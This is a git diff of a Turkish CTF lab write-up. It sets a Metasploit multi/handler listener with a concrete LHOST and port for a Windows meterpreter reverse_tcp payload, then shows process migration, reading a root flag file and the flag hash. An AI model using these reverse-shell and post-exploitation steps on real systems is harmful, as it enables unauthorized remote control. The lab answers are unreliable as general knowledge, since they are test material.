@@ -176,8 +176,8 @@ Payload çalıştırılmadan önce, bağlantıyı karşılayacak **multi/handler
 ```bash
 use exploit/multi/handler
 set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <THM-IP>
-set LPORT <listening-port>
+set LHOST 192.168.134.19
+set LPORT 4444
 run
 ```
 
@@ -221,9 +221,7 @@ meterpreter > migrate 668
 [*] Migrating from 2600 to 668...
 [*] Migration completed successfully.
 ```
-
 <img width="368" height="49" alt="migrate2" src="https://github.com/user-attachments/assets/ab6f4e28-6b08-4ac6-aea9-5945b171199c" />
-
 
 ---
 
@@ -234,9 +232,7 @@ meterpreter > migrate 668
 ```
 meterpreter > cat C:/Windows/System32/config/root.txt
 ```
-
 <img width="451" height="31" alt="flag2" src="https://github.com/user-attachments/assets/ef75939a-00a5-465c-bb5f-af0afc48d319" />
-
 
 ```
 dff0f748678f280250f25a45b8046b4a
